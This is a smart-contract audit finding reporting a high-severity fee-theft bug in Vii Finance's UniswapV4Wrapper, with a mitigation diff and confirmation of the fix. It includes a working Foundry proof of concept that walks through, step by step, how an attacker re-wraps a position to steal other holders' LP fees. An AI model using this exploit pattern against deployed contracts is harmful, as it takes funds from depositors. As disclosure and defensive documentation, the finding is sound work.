---
tags:
  - lang/solidity
  - sector/dex
  - sector/lending
  - sector/nft
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/fee-theft
protocol: "[[Vii]]"
auditors:
  - "[[Giovanni Di Siena]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-15-cyfrin-vii-v2.0.md"
genome:
  - "[[frozen-funds]]"
  - "[[fee-theft]]"
  - "[[account-ownership]]"
  - "[[debt-accrual-update]]"
  - "[[dos-resistance]]"
  - "[[fee-accounting]]"
  - "[[liquidation-underwater]]"
  - "[[timestamp-dependence]]"
---
# Fees can be stolen from partially unwrapped `UniswapV4Wrapper` positions

- id: 61328
- impact: HIGH
- protocol: [[Vii]]
- reporter: Giovanni Di Siena (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-15-cyfrin-vii-v2.0.md

## Summary


The `ERC721WrapperBase` has two functions called `unwrap()` that can be used to transfer ERC-6909 tokens. However, there is a bug in the `UniswapV4Wrapper` function where the `tokensOwed` state is not decremented after a partial unwrap, allowing users to steal fees from other holders. This can also cause a denial of service for other holders trying to fully unwrap their positions. The bug has been fixed in the `VII Finance` contract.

## Details

**Description:** `ERC721WrapperBase` exposes two overloads of the `unwrap()` function to perform full and partial unwrap of the ERC-6909 position for a given `tokenId`:

```solidity
function unwrap(address from, uint256 tokenId, address to) external callThroughEVC {
    _burnFrom(from, tokenId, totalSupply(tokenId));
    underlying.transferFrom(address(this), to, tokenId);
}

function unwrap(address from, uint256 tokenId, address to, uint256 amount, bytes calldata extraData)
    external
    callThroughEVC
{
    _unwrap(to, tokenId, amount, extraData);
    _burnFrom(from, tokenId, amount);
}
```

The full unwrap assumes the caller owns the entire ERC-6909 token supply and will transfer the underlying Uniswap position after burning these tokens. On the other hand, the partial unwrap is used to burn a specified amount of ERC-6909 tokens from the caller and handles proportional distribution of LP fees between all ERC-6909 holders through the virtual `_unwrap()` function.

In Uniswap V3, the LP fee balance is accounted separately from the underlying principal amount such that the pool does not immediately send accrued fees to the user when liquidity is modified but instead increases the `tokensOwed` balance of the position.`UniswapV3Wrapper::_unwrap` calculates the proportion owed to a given ERC-6909 holder based on the owed token accounting managed by the `NonFungiblePositionManager` contract which allows an exact amount to be passed to the `collect()` call:

```solidity
function _unwrap(address to, uint256 tokenId, uint256 amount, bytes calldata extraData) internal override {
    (,,,,,,, uint128 liquidity,,,,) = INonfungiblePositionManager(address(underlying)).positions(tokenId);

    (uint256 amount0, uint256 amount1) =
        _decreaseLiquidity(tokenId, proportionalShare(tokenId, uint256(liquidity), amount).toUint128(), extraData);

    (,,,,,,,,,, uint256 tokensOwed0, uint256 tokensOwed1) =
        INonfungiblePositionManager(address(underlying)).positions(tokenId);

    //amount0 and amount1 is the part of the liquidity
    //token0Owed - amount0 and token1Owed - amount1 are the total fees (the principal is always collected in the same tx). part of the fees needs to be sent to the recipient as well

    INonfungiblePositionManager(address(underlying)).collect(
        INonfungiblePositionManager.CollectParams({
            tokenId: tokenId,
            recipient: to,
            amount0Max: (amount0 + proportionalShare(tokenId, (tokensOwed0 - amount0), amount)).toUint128(),
            amount1Max: (amount1 + proportionalShare(tokenId, (tokensOwed1 - amount1), amount)).toUint128()
        })
    );
}
```

Alternatively, during the modification of liquidity in Uniswap V4 the `PoolManager` transfers the entire balance of earned LP fees directly to the user and requires the delta to be settled in the same transaction. Given that the ERC-6909 tokens corresponding to the underlying Uniswap V4 positions can have multiple holders, it would be incorrect to forward all these fees to the owner who is currently unwrapping their portion. `UniswapV4Wrapper::_unwrap` therefore first accumulates these fees in storage with the `tokensOwed` mapping and utilizes this state for subsequent partial unwraps of other ERC-6909 token holders, distributing only a share of the corresponding token balance to the specified recipient when interacting with their position:

```solidity
function _unwrap(address to, uint256 tokenId, uint256 amount, bytes calldata extraData) internal override {
    PositionState memory positionState = _getPositionState(tokenId);

    (uint256 pendingFees0, uint256 pendingFees1) = _pendingFees(positionState);
    _accumulateFees(tokenId, pendingFees0, pendingFees1);

    uint128 liquidityToRemove = proportionalShare(tokenId, positionState.liquidity, amount).toUint128();
    (uint256 amount0, uint256 amount1) = _principal(positionState, liquidityToRemove);

    _decreaseLiquidity(tokenId, liquidityToRemove, ActionConstants.MSG_SENDER, extraData);

    poolKey.currency0.transfer(to, amount0 + proportionalShare(tokenId, tokensOwed[tokenId].fees0Owed, amount));
    poolKey.currency1.transfer(to, amount1 + proportionalShare(tokenId, tokensOwed[tokenId].fees1Owed, amount));
}
```

In other words, unlike `UniswapV3Wrapper`, the `UniswapV4Wrapper` is expected to hold some non-zero balance of `currency0` and `currency1` for a partially unwrapped ERC-6909 position until all the holders of this `tokenId` have unwrapped. Also note that while the partial unwrap is intended for use following partial liquidations, it is possible to use this overload to perform a full unwrap. The proportional share calculations will be executed to transfer the underlying principal balance plus LP fees to the sole holder, leaving the empty liquidity position in the wrapper contract as documented in a separate issue. Given that the total supply of ERC-6909 tokens will be reduced to zero, `_burnFrom()` can be called by any sender without reverting and so the empty Uniswap V4 position can be recovered by subsequently invoking the full unwrap.

Combined with the fact that the `tokensOwed` state is never decremented, this edge case can be used to manipulate the internal accounting of `UniswapV4Wrapper` by repeatedly wrapping and unwrapping a position that was previously partially unwrapped. Consider the following scenario:

* Alice wraps a Uniswap V4 position.
* Time passes and the position accumulates some fees.
* Alice fully unwraps the position using the partial unwrap overload, causing liquidity and fees to be decreased to zero as described above.
* Alice then fully unwraps to retrieve the underlying position and increases its liquidity once again.
* Alice re-wraps the same Uniswap V4 position and is once again minted the full corresponding ERC-6909 balance.
* Despite fully unwrapping the position, the `tokensOwed` mapping still contains non-zero values in storage corresponding to the fees accumulated by the position from the first time it was wrapped.
* Alice can now re-use this state to siphon tokens out of the `UniswapV4Wrapper`, stealing LP fees that are intended for the holders of other positions that have been partially unwrapped.

To summarize, a partially unwrapped position will have its proportional fees owed to other holders stored in the wrapper, and chaining this with the ability to recover and re-wrap a position that has already been fully unwrapped, the stale `tokensOwned` state can be used to steal the unclaimed fees from holders of other partially unwrapped positions. As demonstrated in the PoC below and detailed in a separate finding, this also causes a DoS for other holders attempting to fully unwrap their partial balance, which could be leveraged to affect liquidations and cause bad debt to accrue in the vault.

**Impact:** Fees can be stolen from ERC-6909 holders for positions that have been partially unwrapped at least once, representing a high impact. The expectation is for a given `tokenId` to have multiple holder only in the case of a partial liquidation, and the issue does not arise for full liquidation in which the liquidator becomes the sole owner; however, in reality there is nothing preventing legitimate users from partially unwrapping their own positions. For example, it is reasonable to assume that a user would partially unwrap to retrieve some liquidity from a large position that still has enough collateral to continue backing any outstanding borrows, causing the LP fee transfer to be triggered, accounted to the wrapper contract and enabling the attack with medium/high likelihood.

**Proof of Concept:** Apply the following patch and execute `forge test --mt test_feeTheftPoC -vvv`:

```diff
---
 .../periphery/UniswapMintPositionHelper.sol   |  52 ++++++
 .../test/uniswap/UniswapV4Wrapper.t.sol       | 163 +++++++++++++++++-
 2 files changed, 214 insertions(+), 1 deletion(-)

diff --git a/vii-finance-smart-contracts/src/uniswap/periphery/UniswapMintPositionHelper.sol b/vii-finance-smart-contracts/src/uniswap/periphery/UniswapMintPositionHelper.sol
index 8888549..68aedf9 100644
--- a/vii-finance-smart-contracts/src/uniswap/periphery/UniswapMintPositionHelper.sol
+++ b/vii-finance-smart-contracts/src/uniswap/periphery/UniswapMintPositionHelper.sol
@@ -124,5 +124,57 @@ contract UniswapMintPositionHelper is EVCUtil {
         positionManager.modifyLiquidities{value: address(this).balance}(abi.encode(actions, params), block.timestamp);
     }

+    function increaseLiquidity(
+        PoolKey calldata poolKey,
+        uint256 tokenId,
+        uint128 liquidityDelta,
+        uint256 amount0Max,
+        uint256 amount1Max,
+        address recipient
+    ) external payable {
+        Currency curr0 = poolKey.currency0;
+        Currency curr1 = poolKey.currency1;
+
+        if (amount0Max > 0) {
+            address t0 = Currency.unwrap(curr0);
+            if (!curr0.isAddressZero()) {
+                IERC20(t0).safeTransferFrom(msg.sender, address(this), amount0Max);
+            } else {
+                // native ETH case
+                require(msg.value >= amount0Max, "Insufficient ETH");
+                weth.deposit{value: amount0Max}();
+            }
+        }
+        if (amount1Max > 0) {
+            address t1 = Currency.unwrap(curr1);
+            IERC20(t1).safeTransferFrom(msg.sender, address(this), amount1Max);
+        }
+
+        if (!curr0.isAddressZero()) {
+            curr0.transfer(address(positionManager), amount0Max);
+        }
+
+        curr1.transfer(address(positionManager), amount1Max);
+
+        bytes memory actions = new bytes(5);
+        actions[0] = bytes1(uint8(Actions.INCREASE_LIQUIDITY));
+        actions[1] = bytes1(uint8(Actions.SETTLE));
+        actions[2] = bytes1(uint8(Actions.SETTLE));
+        actions[3] = bytes1(uint8(Actions.SWEEP));
+        actions[4] = bytes1(uint8(Actions.SWEEP));
+
+        bytes[] memory params = new bytes[](5);
+        params[0] = abi.encode(tokenId, liquidityDelta, amount0Max, amount1Max, bytes(""));
+        params[1] = abi.encode(curr0, ActionConstants.OPEN_DELTA, false);
+        params[2] = abi.encode(curr1, ActionConstants.OPEN_DELTA, false);
+        params[3] = abi.encode(curr0, recipient);
+        params[4] = abi.encode(curr1, recipient);
+
+        positionManager.modifyLiquidities{ value: address(this).balance }(
+            abi.encode(actions, params),
+            block.timestamp
+        );
+    }
+
     receive() external payable {}
 }
diff --git a/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol b/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
index fa6c18b..2fce3ed 100644
--- a/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
+++ b/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
@@ -125,7 +125,7 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {

     TestRouter public router;

-    bool public constant TEST_NATIVE_ETH = true;
+    bool public constant TEST_NATIVE_ETH = false;

     function deployWrapper() internal override returns (ERC721WrapperBase) {
         currency0 = Currency.wrap(address(token0));
@@ -258,6 +258,36 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {
         amount0 = token0BalanceBefore - targetPoolKey.currency0.balanceOf(owner);
         amount1 = token1BalanceBefore - targetPoolKey.currency1.balanceOf(owner);
     }
+
+    function increasePosition(
+        PoolKey memory targetPoolKey,
+        uint256 targetTokenId,
+        uint128 liquidity,
+        uint256 amount0Desired,
+        uint256 amount1Desired,
+        address owner
+    ) internal returns (uint256 amount0, uint256 amount1) {
+        deal(address(token0), owner, amount0Desired * 2 + 1);
+        deal(address(token1), owner, amount1Desired * 2 + 1);
+
+        uint256 token0BalanceBefore = targetPoolKey.currency0.balanceOf(owner);
+        uint256 token1BalanceBefore = targetPoolKey.currency1.balanceOf(owner);
+
+        mintPositionHelper.increaseLiquidity{value: targetPoolKey.currency0.isAddressZero() ? amount0Desired * 2 + 1 : 0}(
+            targetPoolKey, targetTokenId, liquidity, amount0Desired, amount1Desired, owner
+        );
+
+        //ensure any unused tokens are returned to the borrower and position manager balance is zero
+        // assertEq(targetPoolKey.currency0.balanceOf(address(positionManager)), 0);
+        assertEq(targetPoolKey.currency1.balanceOf(address(positionManager)), 0);
+
+        //for some reason, there is 1 wei of dust native eth left in the mintPositionHelper contract
+        // assertEq(targetPoolKey.currency0.balanceOf(address(mintPositionHelper)), 0);
+        assertEq(targetPoolKey.currency1.balanceOf(address(mintPositionHelper)), 0);
+
+        amount0 = token0BalanceBefore - targetPoolKey.currency0.balanceOf(owner);
+        amount1 = token1BalanceBefore - targetPoolKey.currency1.balanceOf(owner);
+    }

     function swapExactInput(address swapper, address tokenIn, address tokenOut, uint256 inputAmount)
         internal
@@ -313,6 +343,34 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {
             borrower
         );
     }
+
+    function boundLiquidityParamsAndMint(LiquidityParams memory params, address _borrower)
+        internal
+        returns (uint256 tokenIdMinted, uint256 amount0Spent, uint256 amount1Spent)
+    {
+        params.liquidityDelta = bound(params.liquidityDelta, 10e18, 10_000e18);
+        (uint160 sqrtRatioX96,,,) = poolManager.getSlot0(poolId);
+        params = createFuzzyLiquidityParams(params, poolKey.tickSpacing, sqrtRatioX96);
+
+        (uint256 estimatedAmount0Required, uint256 estimatedAmount1Required) = LiquidityAmounts.getAmountsForLiquidity(
+            sqrtRatioX96,
+            TickMath.getSqrtPriceAtTick(params.tickLower),
+            TickMath.getSqrtPriceAtTick(params.tickUpper),
+            uint128(uint256(params.liquidityDelta))
+        );
+
+        startHoax(_borrower);
+
+        (tokenIdMinted, amount0Spent, amount1Spent) = mintPosition(
+            poolKey,
+            params.tickLower,
+            params.tickUpper,
+            estimatedAmount0Required,
+            estimatedAmount1Required,
+            uint256(params.liquidityDelta),
+            _borrower
+        );
+    }

     function testGetSqrtRatioX96() public view {
         uint256 fixedDecimals = 10 ** 18;
@@ -418,6 +476,109 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {
         assertApproxEqAbs(poolKey.currency1.balanceOf(borrower), amount1BalanceBefore + amount1Spent, 1);
     }

+    function test_feeTheftPoC() public {
+       int256 liquidityDelta = -19999;
+       uint256 swapAmount = 100_000 * unit0;
+
+       LiquidityParams memory params = LiquidityParams({
+           tickLower: TickMath.MIN_TICK + 1,
+           tickUpper: TickMath.MAX_TICK - 1,
+           liquidityDelta: liquidityDelta
+       });
+
+       // 1. create position on behalf of borrower
+       (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
+
+       address attacker = makeAddr("attacker");
+       deal(token0, attacker, 100 * unit0);
+       deal(token1, attacker, 100 * unit1);
+       startHoax(attacker);
+       SafeERC20.forceApprove(IERC20(token0), address(router), type(uint256).max);
+       SafeERC20.forceApprove(IERC20(token1), address(router), type(uint256).max);
+       SafeERC20.forceApprove(IERC20(token0), address(mintPositionHelper), type(uint256).max);
+       SafeERC20.forceApprove(IERC20(token1), address(mintPositionHelper), type(uint256).max);
+
+       // 2. create position on behalf of attacker
+       (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params, attacker);
+
+       // 3. wrap and enable tokenId1 for borrower
+       startHoax(borrower);
+       wrapper.underlying().approve(address(wrapper), tokenId1);
+       wrapper.wrap(tokenId1, borrower);
+       wrapper.enableTokenIdAsCollateral(tokenId1);
+
+       // 4. wrap and enable tokenId2 for attacker
+       startHoax(attacker);
+       wrapper.underlying().approve(address(wrapper), tokenId2);
+       wrapper.wrap(tokenId2, attacker);
+       wrapper.enableTokenIdAsCollateral(tokenId2);
+
+       // 5. swap so that some fees are generated for tokenId1 and tokenId2
+       swapExactInput(borrower, address(token0), address(token1), swapAmount);
+
+       (uint256 expectedFees0Position1, uint256 expectedFees1Position1) =
+           MockUniswapV4Wrapper(payable(address(wrapper))).pendingFees(tokenId1);
+
+       (uint256 expectedFees0Position2, uint256 expectedFees1Position2) =
+           MockUniswapV4Wrapper(payable(address(wrapper))).pendingFees(tokenId2);
+
+       console.log("Expected Fees Position 1: %s, %s", expectedFees0Position1, expectedFees1Position1);
+       console.log("Expected Fees Position 2: %s, %s", expectedFees0Position2, expectedFees1Position2);
+
+       // 6. unwrap 10% of tokenId1 for borrower which causes fees to be transferred to wrapper
+       startHoax(borrower);
+       wrapper.unwrap(
+           borrower,
+           tokenId1,
+           borrower,
+           wrapper.balanceOf(borrower, tokenId1) / 10,
+           bytes("")
+       );
+
+       console.log("Wrapper balance of currency0: %s", currency0.balanceOf(address(wrapper)));
+       console.log("Wrapper balance of currency1: %s", currency1.balanceOf(address(wrapper)));
+
+       // 7. attacker fully unwraps tokenId2 through partial unwrap
+       startHoax(attacker);
+       wrapper.unwrap(
+           attacker,
+           tokenId2,
+           attacker,
+           wrapper.FULL_AMOUNT(),
+           bytes("")
+       );
+
+       console.log("Wrapper balance of currency0: %s", currency0.balanceOf(address(wrapper)));
+       console.log("Wrapper balance of currency1: %s", currency1.balanceOf(address(wrapper)));
+
+       // 8. attacker recovers tokenId2 position
+       wrapper.unwrap(
+           attacker,
+           tokenId2,
+           attacker
+       );
+
+       // 9. attacker increases liquidity for tokenId2
+       IERC721(wrapper.underlying()).approve(address(mintPositionHelper), tokenId2);
+       increasePosition(poolKey, tokenId2, 1000, type(uint96).max, type(uint96).max, attacker);
+
+       // 10. attacker wraps tokenId2 again
+       wrapper.underlying().approve(address(wrapper), tokenId2);
+       wrapper.wrap(tokenId2, attacker);
+
+       // 11. attacker steals borrower's fees by partially unwrapping tokenId2 again
+       wrapper.unwrap(
+           attacker,
+           tokenId2,
+           attacker,
+           wrapper.FULL_AMOUNT() * 9 / 10,
+           bytes("")
+       );
+
+       console.log("Wrapper balance of currency0: %s", currency0.balanceOf(address(wrapper)));
+       console.log("Wrapper balance of currency1: %s", currency1.balanceOf(address(wrapper)));
+
+       // 12. borrower tries to unwrap a further 10% of tokenId1 but it reverts because the owed fees were stolen
+       // startHoax(borrower);
+       // wrapper.unwrap(
+       //     borrower,
+       //     tokenId1,
+       //     borrower,
+       //     wrapper.FULL_AMOUNT() / 10,
+       //     bytes("")
+       // );
+    }
+
     function testFuzzFeeMath(int256 liquidityDelta, uint256 swapAmount) public {
         LiquidityParams memory params = LiquidityParams({
             tickLower: TickMath.MIN_TICK + 1,
--
2.40.0

```

**Recommended Mitigation:** Decrement the `tokensOwed` state for a given ERC-6909 `tokenId` once the corresponding fees have been  have been collected:

```diff
function _unwrap(address to, uint256 tokenId, uint256 amount, bytes calldata extraData) internal override {
        PositionState memory positionState = _getPositionState(tokenId);

        ...

+       uint256 proportionalFee0 =  proportionalShare(tokenId, tokensOwed[tokenId].fees0Owed, amount);
+       uint256 proportionalFee1 =  proportionalShare(tokenId, tokensOwed[tokenId].fees1Owed, amount);
+       tokensOwed[tokenId].fees0Owed -= proportionalFee0;
+       tokensOwed[tokenId].fees1Owed -= proportionalFee1;
-       poolKey.currency0.transfer(to, amount0 + proportionalShare(tokenId, tokensOwed[tokenId].fees0Owed, amount));
-       poolKey.currency1.transfer(to, amount1 + proportionalShare(tokenId, tokensOwed[tokenId].fees1Owed, amount));
+       poolKey.currency0.transfer(to, amount0 + proportionalFee0);
+       poolKey.currency1.transfer(to, amount1 + proportionalFee1);
    }
```

**VII Finance:** Fixed in commit [8c6b6cc](https://github.com/kankodu/vii-finance-smart-contracts/commit/8c6b6cca4ed65b22053dc7ffaa0b77d06a160caf).

**Cyfrin:** Verified. The `tokensOwed` state is now decremented following partial unwrap. Note that to strictly conform to the Checks-Effects-Interactions pattern this should occur before the external transfer calls (modified in commit [88c9eec](https://github.com/kankodu/vii-finance-smart-contracts/commit/88c9eec6af4db1aaf7ddbd6d5fdd8a0cc0b65d93)).
